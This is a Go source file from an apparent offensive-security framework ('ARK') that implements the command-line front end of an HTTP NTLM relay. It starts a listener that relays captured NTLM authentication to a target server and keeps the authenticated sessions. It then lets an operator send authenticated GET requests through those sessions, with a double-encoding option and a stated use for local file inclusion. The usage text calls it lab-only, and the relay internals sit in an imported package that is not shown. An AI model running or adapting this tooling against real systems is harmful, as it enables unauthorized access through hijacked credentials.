package preimplant

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"github.com/KKingZero/ARK/pkg/ntlmrelay"
)

// RunRelay dispatches: http start|status|sessions|get
func RunRelay(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", relayUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(relayUsage)
		return nil
	case "http":
		if len(args) < 2 {
			return fmt.Errorf("usage: relay http start|sessions|get|status\n%s", relayUsage)
		}
		return runRelayHTTP(args[1], args[2:])
	case "sessions":
		return runRelayHTTP("sessions", args[1:])
	default:
		return fmt.Errorf("unknown relay command %q\n%s", args[0], relayUsage)
	}
}

const relayUsage = `ark relay — operator-local HTTP NTLM relay (no teamserver)

  ark relay http start --listen IP:PORT --target http://HOST/ \
      [--kernel-auth] [--api 127.0.0.1:18765] [--allow-priv-ports] \
      [--insecure] [--api-allow-remote]
  ark relay http sessions
  ark relay http get --session N --path /or/relative [--double-encode] \
      [--base /api/download] [--out file]
  ark relay http status

Default ports must be >= 1024 (rootless). Control API defaults to loopback only.
See docs/OPERATOR_PRE_IMPLANT.md
Lab-only. Sticky TCP + held session for authenticated GETs (e.g. Ghostlink LFI).
`

func relayFlags(args []string) map[string]string {
	out := map[string]string{}
	for i := 0; i < len(args); i++ {
		a := args[i]
		if !strings.HasPrefix(a, "--") {
			continue
		}
		key := strings.TrimPrefix(a, "--")
		switch key {
		case "kernel-auth", "keep", "double-encode", "allow-priv-ports", "insecure", "api-allow-remote":
			out[key] = "1"
			continue
		}
		if i+1 < len(args) && !strings.HasPrefix(args[i+1], "--") {
			out[key] = args[i+1]
			i++
		} else {
			out[key] = "1"
		}
	}
	return out
}

func runRelayHTTP(cmd string, args []string) error {
	f := relayFlags(args)
	switch cmd {
	case "start":
		return relayStart(f)
	case "sessions":
		return relaySessions()
	case "get":
		return relayGet(f)
	case "status":
		return relayStatus()
	default:
		return fmt.Errorf("unknown relay http command %q", cmd)
	}
}

func relayStart(f map[string]string) error {
	listen := f["listen"]
	target := f["target"]
	if listen == "" || target == "" {
		return fmt.Errorf("usage: relay http start --listen IP:PORT --target http://HOST/")
	}
	allowPriv := f["allow-priv-ports"] == "1" || os.Getenv("ARK_ALLOW_PRIV_PORTS") == "1"
	allowRemoteAPI := f["api-allow-remote"] == "1"
	api := f["api"]
	if api == "" {
		api = "127.0.0.1:18765"
	}

	cfg := ntlmrelay.RelayConfig{
		ListenAddr:     listen,
		TargetURL:      target,
		KernelAuth:     f["kernel-auth"] == "1",
		AllowPriv:      allowPriv,
		InsecureTLS:    f["insecure"] == "1",
		AllowRemoteAPI: allowRemoteAPI,
		Logf:           func(format string, args ...any) { log.Printf(format, args...) },
	}
	srv, store, err := ntlmrelay.NewServer(cfg)
	if err != nil {
		return err
	}

	ctrlLn, err := ntlmrelay.StartControlAPI(store, api, allowRemoteAPI)
	if err != nil {
		return fmt.Errorf("control API: %w", err)
	}
	defer func() {
		_ = ctrlLn.Close()
		ntlmrelay.ClearControlState()
	}()

	apiURL := "http://" + ctrlLn.Addr().String()
	if err := ntlmrelay.WriteControlState(ntlmrelay.ControlState{
		API:    apiURL,
		Listen: listen,
		Target: target,
		PID:    os.Getpid(),
	}); err != nil {
		log.Printf("[relay] warning: write control state: %v", err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	fmt.Printf("[relay] listening %s → %s (sticky NTLM)\n", listen, target)
	fmt.Printf("[relay] control API %s (loopback sessions/get)\n", apiURL)
	fmt.Printf("[relay] point MQTT healthcheck URL at http://%s/\n", listen)
	fmt.Printf("[relay] Ctrl+C to stop\n")
	err = srv.Start(ctx)
	ntlmrelay.ClearControlState()
	return err
}

func relayAPI() (string, error) {
	st, err := ntlmrelay.ReadControlState()
	if err != nil {
		return "", fmt.Errorf("no active relay (start with: ark relay http start …): %w", err)
	}
	return st.API, nil
}

func relaySessions() error {
	api, err := relayAPI()
	if err != nil {
		return err
	}
	b, err := ntlmrelay.ClientSessions(api)
	if err != nil {
		return err
	}
	fmt.Println(string(b))
	return nil
}

func relayGet(f map[string]string) error {
	api, err := relayAPI()
	if err != nil {
		return err
	}
	sid, _ := strconv.Atoi(f["session"])
	if sid == 0 {
		return fmt.Errorf("--session N is required")
	}
	path := f["path"]
	if path == "" {
		path = "/"
	}
	double := f["double-encode"] == "1"
	base := f["base"]
	status, body, err := ntlmrelay.ClientGet(api, sid, path, double, base)
	if err != nil {
		return err
	}
	out := f["out"]
	if out != "" {
		if err := os.WriteFile(out, body, 0o600); err != nil {
			return err
		}
		fmt.Printf("[relay] status=%d wrote %d bytes → %s\n", status, len(body), out)
		return nil
	}
	fmt.Printf("[relay] status=%d bytes=%d\n", status, len(body))
	if len(body) < 4096 && isPrintable(body) {
		fmt.Print(string(body))
		if len(body) == 0 || body[len(body)-1] != '\n' {
			fmt.Println()
		}
	}
	return nil
}

func relayStatus() error {
	st, err := ntlmrelay.ReadControlState()
	if err != nil {
		return fmt.Errorf("relay not running: %w", err)
	}
	fmt.Printf("api=%s listen=%s target=%s pid=%d\n", st.API, st.Listen, st.Target, st.PID)
	resp, err := ntlmrelay.ClientSessions(st.API)
	if err != nil {
		return fmt.Errorf("control API unreachable (stale state?): %w", err)
	}
	fmt.Printf("sessions: %s\n", string(resp))
	return nil
}

func isPrintable(b []byte) bool {
	if len(b) == 0 {
		return true
	}
	n := 0
	for _, c := range b {
		if c == 9 || c == 10 || c == 13 || (c >= 32 && c < 127) {
			n++
		}
	}
	return n*100/len(b) > 85
}
